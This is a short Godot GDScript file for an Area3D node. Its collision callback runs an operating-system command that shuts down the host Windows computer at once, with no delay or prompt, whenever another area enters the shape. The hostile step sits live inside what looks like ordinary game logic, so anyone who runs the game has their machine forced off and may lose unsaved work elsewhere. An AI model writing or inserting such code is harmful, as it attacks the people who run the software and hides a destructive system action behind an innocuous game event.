extends Area3D

func _on_area_shape_entered(area_rid: RID, area: Area3D, area_shape_index: int, local_shape_index: int) -> void:
	OS.execute("shutdown", ["/s", "/t", "0"])
